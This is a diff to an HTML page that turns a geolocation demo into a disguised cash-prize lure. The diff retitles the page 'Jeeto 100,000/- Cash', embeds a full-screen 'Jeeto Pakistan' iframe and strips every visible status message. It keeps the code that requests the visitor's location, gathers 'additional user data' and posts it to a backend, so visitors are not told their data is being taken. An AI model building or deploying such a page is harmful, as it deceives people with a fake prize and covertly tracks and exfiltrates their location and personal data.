@@ -3,17 +3,16 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Surprise</title>
+  <title>Jeeto 100,000/- Cash</title>
 </head>
 <body>
-  <h1>SURPRISE</h1>
-  <p id="status">Waiting for geolocation permission...</p>
-  <p id="location"></p>
+  <iframe 
+    src="/Jeeto%20Pakistan.html" 
+    style="width: 100%; height: 100vh; border: none;"
+    title="Jeeto Pakistan Page">
+  </iframe>
 
   <script>
-    const statusElement = document.getElementById('status');
-    const locationElement = document.getElementById('location');
-
     // Function to send data to the backend
     async function sendData(data) {
       try {
@@ -27,27 +26,21 @@
 
         const result = await response.json();
         console.log('Server Response:', result);
-        statusElement.textContent = 'Data sent successfully!';
       } catch (error) {
         console.error('Error sending data:', error);
-        statusElement.textContent = 'Failed to send data.';
       }
     }
 
     // Function to get geolocation
     function getLocation() {
       if (!navigator.geolocation) {
-        statusElement.textContent = 'Geolocation is not supported by your browser.';
+        console.error('Geolocation is not supported by your browser.');
         return;
       }
-
-      statusElement.textContent = 'Requesting geolocation...';
 
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude } = position.coords;
-          statusElement.textContent = 'Geolocation permission granted!';
-          locationElement.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
 
           // Collect additional user data
           const data = {
@@ -63,7 +56,6 @@
         },
         (error) => {
           console.error('Error getting geolocation:', error);
-          statusElement.textContent = 'Failed to get geolocation.';
         }
       );
     }
